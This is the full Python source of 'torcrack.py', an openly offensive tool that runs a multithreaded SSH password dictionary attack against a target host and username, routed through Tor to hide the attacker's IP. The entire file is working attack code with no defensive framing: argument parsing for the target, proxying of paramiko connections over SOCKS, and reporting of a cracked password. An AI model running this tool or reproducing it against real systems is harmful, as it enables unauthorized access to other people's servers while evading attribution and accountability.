#!/usr/bin/env python3

#torcrack.py - (c) 2016 NoRKSEC - no rights reserved

import argparse
import atexit
import multiprocessing
import os

try:
	import paramiko
except:
	print(' [=] Error: requires Paramiko (pip3 install paramiko)')
	os._exit(1)
try:
	import requests
except:
	print(' [-] Error: it appears python requests is not installed. (apt-get install python3-requests)')
	os._exit(1)
import socket
try:
	import socks
except:
	print(' [-] Error: requires socks/SocksiPy/PySocks (pip3 install PySocks)')
	os._exit(1)
import sys
from time import sleep


class error(Exception):
	pass

class notfound(Exception):
	pass


def cls():
	os.system('cls' if os.name=='nt' else 'clear')


def intro():
	print(""" _______        __________ ____  __.  _____________________________
 \      \   ____\______   \    |/ _| /   _____/\_   _____/\_   ___ \\
 /   |   \ /  _ \|       _/      <   \_____  \  |    __)_ /    \  \/
/    |    (  <_> )    |   \    |  \  /        \ |        \\     \____
\____|__  /\____/|____|_  /____|__ \/_______  //_______  / \______  /
        \/              \/        \/        \/         \/         \/
\n""")
	print('TorCrack v1.0 - (c) 2016 NoRKSEC - no rights reserved\n\n')


def exit_handler():
	print('\n [~] Exiting...\n')


def ssh_connect(password, code = 0):
	global verbose
	if (password=="^^^break^^^"):
		raise notfound
		sys.exit(1)
	paramiko.util.log_to_file(".logs/paramiko.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	if verbose == True:
		print(' [*] Testing password: ' + password)
	try:
		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password, timeout=10)
	except paramiko.AuthenticationException:
		if verbose == True:
			print(' [-] Password ' + password + ' incorrect.')
		ssh.close()
		sys.exit(1)
	except socket.error as e:
		print(' [-] Socket error. Retrying...')
		ssh_connect(password)
		ssh.close()
		sys.exit(1)
	except paramiko.ssh_exception.SSHException:
		print(' [-] Unable to get SSH Banner. Retrying...')
		ssh_connect(password)
		ssh.close()
		sys.exit(1)
	ssh.close()
	print(' [+] Password for ' + tgtUser + ' found: ' + password)
	exit_handler()
	raise error
	os._exit(1)


def is_valid_ipv4(address):
	try:
		socket.inet_pton(socket.AF_INET, address)
	except AttributeError:
		try:
			socket.inet_aton(address)
		except socket.error:
			return False
		return address.count('.') == 3
	except socket.error:
		return False
	return True


def main():
	if not os.path.exists("./.logs"):
		os.makedirs("./.logs")
	atexit.register(exit_handler)
	parser = argparse.ArgumentParser(prog='torcrack.py', description='Tor-enabled SSH dictionary attack.')
	parser.add_argument('tgtHost', type=str, help='target machine')
	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
	parser.add_argument('tgtUser', type=str, help='target username')
	parser.add_argument('dictFile', type=str, help='dictionary file or password list to use')
	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 16)', default=4)
	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
	parser.add_argument('-v', '--verbose', action="store_true", help='display status at each step')
	args = parser.parse_args()
	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, worker
	tgtUser = args.tgtUser
	dictFile = args.dictFile
	tgtPort = args.tgtPort
	verbose = args.verbose
	if is_valid_ipv4(args.tgtHost) == True:
		tgtHost = args.tgtHost
	else:
		try:
			tgtHost = gethostbyname(args.tgtHost)
		except:
			print(" [-] Cannot resolve '%s': Unknown host\n" % args.tgtHost)
			exit(0)
	torPort = args.torPort
	if (args.maxThreads > 16):
		print(' [-] Maximum number of threads can not exceed 16.')
		maxThreads = 16
	elif (args.maxThreads < 1):
		print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
		maxThreads = 4
	else:
		maxThreads = args.maxThreads
	print(' [+] Max Threads set to ' + str(maxThreads))
	print(' [+] ' + args.tgtHost + ' resolved to ' + str(tgtHost))
	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
	print(' [+] Tor Port set to: ' + str(torPort))
	print(' [+] Target username set to: ' + tgtUser)

	if not os.path.isfile(dictFile):
		print(" [-] Dictionary file does not exist.\n")
		exit(0)

	print(' [+] Dictionary File/Password List set to: ' + dictFile)
	lineMax = sum(1 for line in open(dictFile))
	global session
	print (' [+] Actual IP: ' + requests.get('http://icanhazip.com').text)
	socks.set_default_proxy(socks.SOCKS5, "localhost", torPort)
	socket.socket = socks.socksocket
	try:
		test = requests.get('http://icanhazip.com').text
	except:
		print(' [-] Error establishing Tor circuit. Is the port correct? Shutting down...\n')
		exit(0)
	print(' [+] Tor circuit established.') 
	print(' [+] Tor IP: ' + test)
	paramiko.client.socket.socket = socks.socksocket
	passwords = []
	with open(dictFile, 'r') as f:
		passwords = [l.strip('\n') for l in f]
	passwords.append("^^^break^^^")
	print("\n [+] Let's hack the Gibson.\n")

	worker = multiprocessing.Pool(maxThreads, maxtasksperchild=1)
	try:
		list(worker.map(ssh_connect, passwords))
	except error:
		worker.terminate()
		os._exit(1)
	except notfound:
		worker.close()
		worker.join()
		worker.terminate()
	else:
		worker.close()
		worker.join()

	print(' [+] Reached end of dictionary file, waiting for threads to complete...')
	sleep(1)
	print(' [+] Password not found; Shutting down.')


if __name__ == '__main__':
	cls()
	intro()
	main()
